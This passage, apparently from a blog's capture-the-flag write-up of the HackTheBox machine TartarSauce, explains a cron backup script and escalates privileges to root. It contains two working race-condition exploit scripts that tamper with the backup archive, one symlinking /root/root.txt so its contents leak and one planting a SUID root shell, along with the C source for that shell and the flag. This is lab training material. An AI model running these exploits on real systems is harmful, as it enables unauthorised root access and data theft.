#<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Set Vars Here</span></span>
basedir<span class="token operator">=</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html
bkpdir<span class="token operator">=</span><span class="token operator">/</span>var<span class="token operator">/</span>backups
tmpdir<span class="token operator">=</span><span class="token operator">/</span>var<span class="token operator">/</span>tmp
testmsg<span class="token operator">=</span>$bkpdir<span class="token operator">/</span>onuma_backup_test<span class="token punctuation">.</span>txt
errormsg<span class="token operator">=</span>$bkpdir<span class="token operator">/</span>onuma_backup_error<span class="token punctuation">.</span>txt
tmpfile<span class="token operator">=</span>$tmpdir<span class="token operator">/</span><span class="token punctuation">.</span>$<span class="token punctuation">(</span><span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>head <span class="token operator">-</span>c100 <span class="token operator">/</span>dev<span class="token operator">/</span>urandom <span class="token operator">|</span>sha1sum<span class="token operator">|</span>cut <span class="token operator">-</span>d<span class="token char">' '</span> <span class="token operator">-</span>f1<span class="token punctuation">)</span>
check<span class="token operator">=</span>$tmpdir<span class="token operator">/</span>check
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">formatting</span></span>
<span class="token function">printbdr</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> n in $<span class="token punctuation">(</span>seq <span class="token number">72</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">do</span> <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>printf $<span class="token string">"-"</span><span class="token punctuation">;</span>
    done
<span class="token punctuation">&#125;</span>
bdr<span class="token operator">=</span>$<span class="token punctuation">(</span>printbdr<span class="token punctuation">)</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Added a test file to let us see when the last backup was run</span></span>
<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>printf $<span class="token string">"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n"</span> <span class="token operator">></span> $testmsg
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Cleanup from last time<span class="token punctuation">.</span></span></span>
<span class="token operator">/</span>bin<span class="token operator">/</span>rm <span class="token operator">-</span>rf $tmpdir<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">*</span> $check
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Backup onuma website dev files<span class="token punctuation">.</span></span></span>
<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>sudo <span class="token operator">-</span>u onuma <span class="token operator">/</span>bin<span class="token operator">/</span>tar <span class="token operator">-</span>zcvf $tmpfile $basedir <span class="token operator">&amp;</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Added delay to wait <span class="token keyword">for</span> backup to complete <span class="token keyword">if</span> large files get added<span class="token punctuation">.</span></span></span>
<span class="token operator">/</span>bin<span class="token operator">/</span>sleep <span class="token number">30</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Test the backup integrity</span></span>
<span class="token function">integrity_chk</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>diff <span class="token operator">-</span>r $basedir $check$basedir
<span class="token punctuation">&#125;</span>
<span class="token operator">/</span>bin<span class="token operator">/</span>mkdir $check
<span class="token operator">/</span>bin<span class="token operator">/</span>tar <span class="token operator">-</span>zxvf $tmpfile <span class="token operator">-</span>C $check
<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> $<span class="token punctuation">(</span>integrity_chk<span class="token punctuation">)</span> <span class="token punctuation">]</span><span class="token punctuation">]</span>
then
    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Report errors so the dev can investigate the issue<span class="token punctuation">.</span></span></span>
    <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>printf $<span class="token string">"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n"</span> <span class="token operator">>></span> $errormsg
    integrity_chk <span class="token operator">>></span> $errormsg
    exit <span class="token number">2</span>
<span class="token keyword">else</span>
    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Clean up and save archive to the bkpdir<span class="token punctuation">.</span></span></span>
    <span class="token operator">/</span>bin<span class="token operator">/</span>mv $tmpfile $bkpdir<span class="token operator">/</span>onuma<span class="token operator">-</span>www<span class="token operator">-</span>dev<span class="token punctuation">.</span>bak
    <span class="token operator">/</span>bin<span class="token operator">/</span>rm <span class="token operator">-</span>rf $check <span class="token punctuation">.</span><span class="token operator">*</span>
    exit <span class="token number">0</span>
fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>I’ll try to break it down into its important step<br>a. Use the tar command as onuma to take everything in $basedir( &#x2F;var&#x2F;www&#x2F;html ) and save it as a gzip archive(-z) named $tmpfile. $tmpfile is &#x2F;var&#x2F;tmp&#x2F;.[random sha1], so we know it will start with a “ . “,and what folder it will be in, but nothing else.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Backup onuma website dev files.</span>
/usr/bin/sudo <span class="token parameter variable">-u</span> onuma /bin/tar <span class="token parameter variable">-zcvf</span> <span class="token variable">$tmpfile</span> <span class="token variable">$basedir</span> <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>b. Sleep for 30 seconds</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/bin/sleep <span class="token number">30</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>c. Make a temporary directory at &#x2F;vat&#x2F;tmp&#x2F;check</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/bin/mkdir <span class="token variable">$check</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>d. Extract $tmpfile to &#x2F;var&#x2F;tmp&#x2F;check</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/bin/tar <span class="token parameter variable">-zxvf</span> <span class="token variable">$tmpfile</span> <span class="token parameter variable">-C</span> <span class="token variable">$check</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>e. Run the integrity_chk function, and it is exits cleanly, move the temp archive to &#x2F;var&#x2F;backups&#x2F;onuma-www-dev.bak, and if not run integrity_chk again, and append its output to &#x2F;var&#x2F;backups&#x2F;onuma_backup_error.txt</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable"><span class="token variable">$(</span>integrity_chk<span class="token variable">)</span></span> <span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token keyword">then</span>
    <span class="token comment"># Report errors so the dev can investigate the issue.</span>
    /usr/bin/printf $<span class="token string">"<span class="token variable">$bdr</span><span class="token entity" title="\n">\n</span>Integrity Check Error in backup last ran :  <span class="token variable"><span class="token variable">$(</span>/bin/date<span class="token variable">)</span></span><span class="token entity" title="\n">\n</span><span class="token variable">$bdr</span><span class="token entity" title="\n">\n</span><span class="token variable">$tmpfile</span><span class="token entity" title="\n">\n</span>"</span> <span class="token operator">>></span> <span class="token variable">$errormsg</span>
    integrity_chk <span class="token operator">>></span> <span class="token variable">$errormsg</span>
    <span class="token builtin class-name">exit</span> <span class="token number">2</span>
<span class="token keyword">else</span>
    <span class="token comment"># Clean up and save archive to the bkpdir.</span>
    /bin/mv <span class="token variable">$tmpfile</span> <span class="token variable">$bkpdir</span>/onuma-www-dev.bak
    /bin/rm <span class="token parameter variable">-rf</span> <span class="token variable">$check</span> .*
    <span class="token builtin class-name">exit</span> <span class="token number">0</span>
<span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Exploiting-backuperer"><a href="#Exploiting-backuperer" class="headerlink" title="Exploiting backuperer"></a>Exploiting backuperer</h3><h4 id="Get-the-root-flag"><a href="#Get-the-root-flag" class="headerlink" title="Get the root flag"></a>Get the root flag</h4><p>To exploit the script, we’ll take advantage of two things, the sleep for the 30s and the recursive diff. During sleep, we can unpack the archive, replace one of the files with a link to &#x2F;root&#x2F;root.txt, and re-archive it. Then when the script opens the archive and runs the diff, the resulting file will be different, and the contents of both files will end up in the log file.<br>I originally did this with a long bash one-liner, but it is easier to follow with a script:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Author: Kelpie_Banshee</span>
<span class="token comment">#!/bin/bash</span>
<span class="token comment"># work out of some directory you are writeable and executable</span>
<span class="token builtin class-name">cd</span> /dev/shm
<span class="token comment"># set both start and cur equal to any backup file if it's there</span>
<span class="token assign-left variable">start</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">find</span> /var/tmp <span class="token parameter variable">-maxdepth</span> <span class="token number">1</span> <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">".*"</span><span class="token variable">)</span></span>
<span class="token assign-left variable">cur</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">find</span> /var/tmp <span class="token parameter variable">-maxdepth</span> <span class="token number">1</span> <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">".*"</span><span class="token variable">)</span></span>
<span class="token builtin class-name">echo</span> <span class="token string">"[+] Wait for new file"</span>
<span class="token keyword">while</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$start</span>"</span> <span class="token operator">==</span> <span class="token string">"<span class="token variable">$cur</span>"</span> <span class="token parameter variable">-o</span> <span class="token string">"<span class="token variable">$cur</span>"</span> <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">do</span>
    <span class="token function">sleep</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token assign-left variable">cur</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">find</span> /var/tmp <span class="token parameter variable">-maxdepth</span> <span class="token number">1</span> <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">".*"</span><span class="token variable">)</span></span><span class="token punctuation">;</span>
<span class="token keyword">done</span>
<span class="token comment"># Grab the zip in the directory</span>
<span class="token builtin class-name">echo</span> <span class="token string">"[+] Copy the zip file to work directory"</span>
<span class="token function">cp</span> <span class="token variable">$cur</span> <span class="token builtin class-name">.</span>
<span class="token assign-left variable">filename</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> $cur <span class="token operator">|</span> <span class="token function">cut</span> -d<span class="token string">'/'</span> <span class="token parameter variable">-f4</span><span class="token variable">)</span></span>
<span class="token comment"># Extract the archive</span>
<span class="token function">tar</span> <span class="token parameter variable">-zxf</span> <span class="token variable">$filename</span>
<span class="token comment"># Replace the robots.txt</span>
<span class="token function">rm</span> var/www/html/robots.txt
<span class="token function">ln</span> <span class="token parameter variable">-s</span> /root/root.txt var/www/html/robots.txt <span class="token comment"># Symbolic links</span>
<span class="token function">rm</span> <span class="token variable">$filename</span>
<span class="token function">tar</span> czf <span class="token variable">$filename</span> var
<span class="token comment"># Put it back, and clean up</span>
<span class="token function">mv</span> <span class="token variable">$filename</span> <span class="token variable">$cur</span>
<span class="token function">rm</span> <span class="token variable">$filename</span>
<span class="token function">rm</span> <span class="token parameter variable">-rf</span> var
<span class="token comment"># Wait for the new error log</span>
<span class="token builtin class-name">echo</span> <span class="token string">"[+] Waiting for the new error log"</span>
<span class="token function">tail</span> <span class="token parameter variable">-f</span> /var/backups/onuma_backup_error.txt
<span class="token builtin class-name">exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Now, upload this to target and run it. I’ll name it exp.sh for opsec:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./exp.sh
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wait <span class="token keyword">for</span> new <span class="token function">file</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Copy the <span class="token function">zip</span> <span class="token function">file</span> to work directory
tar: var/www/html/webservices/monstra-3.0.4/public/uploads/.empty: Cannot open: Permission denied
tar: Exiting with failure status due to previous errors
tar: var/www/html/webservices/monstra-3.0.4/public/uploads/.empty: Cannot stat: Permission denied
tar: Exiting with failure status due to previous errors
rm: cannot remove <span class="token string">'.97ac3271d196cc084ec0f2b26df0efe63ff7d73e'</span><span class="token builtin class-name">:</span> No such <span class="token function">file</span> or directory
rm: cannot remove <span class="token string">'var/www/html/webservices/monstra-3.0.4/public/uploads/.empty'</span><span class="token builtin class-name">:</span> Permission denied
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Waiting <span class="token keyword">for</span> the new error log
<span class="token operator">&lt;</span> User-agent: *
<span class="token operator">&lt;</span> Disallow: /webservices/tar/tar/source/
<span class="token operator">&lt;</span> Disallow: /webservices/monstra-3.0.4/
<span class="token operator">&lt;</span> Disallow: /webservices/easy-file-uploader/
<span class="token operator">&lt;</span> Disallow: /webservices/developmental/
<span class="token operator">&lt;</span> Disallow: /webservices/phpmyadmin/
<span class="token operator">&lt;</span>
---
<span class="token operator">></span> e79abdab8b8a4b64f8579a10b2cd09f9
Only <span class="token keyword">in</span> /var/www/html/webservices/monstra-3.0.4/public/uploads: .empty
tail: inotify resources exhausted
tail: inotify cannot be used, reverting to polling<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Root flag: e79abdab8b8a4b64f8579a10b2cd09f9</p>
<h4 id="Get-the-root-shell"><a href="#Get-the-root-shell" class="headerlink" title="Get the root shell"></a>Get the root shell</h4><p>we can make the SUID shell</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Usage: gcc -m32 -o suid suid.c &amp;&amp; ./suid</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">setreuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>From the output of uname-a, we have seen that tartarsauce has a 32-bit architecture, so the compilation is as follows:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Local Machine:
<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> gcc-multilib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gcc <span class="token parameter variable">-m32</span> <span class="token parameter variable">-o</span> suid suid.c
<span class="token function">sudo</span> <span class="token function">mkdir</span> <span class="token parameter variable">-p</span>  var/www/html
<span class="token function">sudo</span> <span class="token function">cp</span> suid var/www/html
<span class="token function">sudo</span> <span class="token function">chmod</span> <span class="token number">6555</span> var/www/html/suid
<span class="token function">ls</span> <span class="token parameter variable">-la</span> var/www/html/suid
-r-sr-sr-x <span class="token number">1</span> root root <span class="token number">15480</span> Nov  <span class="token number">1</span> <span class="token number">16</span>:35 var/www/html/suid
<span class="token function">sudo</span> <span class="token function">tar</span> <span class="token parameter variable">-zcvf</span> suid.tar.gz var <span class="token parameter variable">--owner</span><span class="token operator">=</span>root <span class="token parameter variable">--group</span><span class="token operator">=</span>root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Author: Kelpie_Banshee</span>
<span class="token comment"># !/bin/bash</span>
<span class="token comment"># Usage: bash shell.sh</span>
<span class="token comment"># work out of some directory you are writeable and executable</span>
<span class="token builtin class-name">cd</span> /tmp
<span class="token comment"># set both start and cur equal to any backup file if it's there</span>
<span class="token assign-left variable">start</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">find</span> /var/tmp <span class="token parameter variable">-maxdepth</span> <span class="token number">1</span> <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">".*"</span><span class="token variable">)</span></span>
<span class="token assign-left variable">cur</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">find</span> /var/tmp <span class="token parameter variable">-maxdepth</span> <span class="token number">1</span> <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">".*"</span><span class="token variable">)</span></span>
<span class="token comment"># loop until there's a change in cur</span>
<span class="token builtin class-name">echo</span> <span class="token string">"[+] Waiting for archive filename to change"</span>
<span class="token keyword">while</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$cur</span>"</span> <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">do</span>
    <span class="token function">sleep</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token assign-left variable">cur</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">find</span> /var/tmp <span class="token parameter variable">-maxdepth</span> <span class="token number">1</span> <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">".*"</span><span class="token variable">)</span></span><span class="token punctuation">;</span>
<span class="token keyword">done</span>
<span class="token builtin class-name">echo</span> <span class="token string">"[+] Copy the archive"</span>
<span class="token builtin class-name">echo</span> <span class="token variable">$cur</span>
<span class="token comment"># Relpace the original archive</span>
<span class="token function">cp</span> suid.tar.gz <span class="token variable">$cur</span>
<span class="token builtin class-name">exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkVq2D3G4aoTUBw4zi7FIHXj611d.png"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TartarSauce"><span class="toc-number">1.</span> <span class="toc-text">TartarSauce</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Target"><span class="toc-number">1.1.</span> <span class="toc-text">Target</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Process"><span class="toc-number">2.</span> <span class="toc-text">Process</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-Scan"><span class="toc-number">2.1.</span> <span class="toc-text">Port Scan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Info-collection"><span class="toc-number">2.2.</span> <span class="toc-text">Info collection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Wordpress-Site"><span class="toc-number">2.3.</span> <span class="toc-text">Wordpress Site</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Wpscan"><span class="toc-number">2.4.</span> <span class="toc-text">Wpscan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-www-date"><span class="toc-number">2.5.</span> <span class="toc-text">Shell as www-date</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-onuma"><span class="toc-number">2.6.</span> <span class="toc-text">Shell as onuma</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-the-user-flag"><span class="toc-number">2.6.1.</span> <span class="toc-text">Get the user flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privesc-onuma-%E2%86%92-root"><span class="toc-number">2.7.</span> <span class="toc-text">Privesc onuma → root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Indentify-the-cron-with-pspy32"><span class="toc-number">2.7.1.</span> <span class="toc-text">Indentify the cron with pspy32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Understanding-backuper-script"><span class="toc-number">2.7.2.</span> <span class="toc-text">Understanding backuper script</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-backuperer"><span class="toc-number">2.7.3.</span> <span class="toc-text">Exploiting backuperer</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Get-the-root-flag"><span class="toc-number">2.7.3.1.</span> <span class="toc-text">Get the root flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Get-the-root-shell"><span class="toc-number">2.7.3.2.</span> <span class="toc-text">Get the root shell</span></a></li></ol></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack%20[12].html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack%20[12].html&text=HTB-TartarSauce"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack%20[12].html&title=HTB-TartarSauce"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack%20[12].html&is_video=false&description=HTB-TartarSauce"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HTB-TartarSauce&body=Check out this article: http://kelpie.top/post/Virtual%20Attack%20[12].html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack%20[12].html&title=HTB-TartarSauce"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[12].html&title=HTB-TartarSauce"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[12].html&title=HTB-TartarSauce"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[12].html&title=HTB-TartarSauce"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack%20[12].html&name=HTB-TartarSauce&description=&lt;h1 id=&#34;TartarSauce&#34;&gt;&lt;a href=&#34;#TartarSauce&#34; class=&#34;headerlink&#34; title=&#34;TartarSauce&#34;&gt;&lt;/a&gt;TartarSauce&lt;/h1&gt;&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;2 flags&lt;/li&gt;
&lt;/ol&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack%20[12].html&t=HTB-TartarSauce"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021-2024
    l3vi4th4n
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
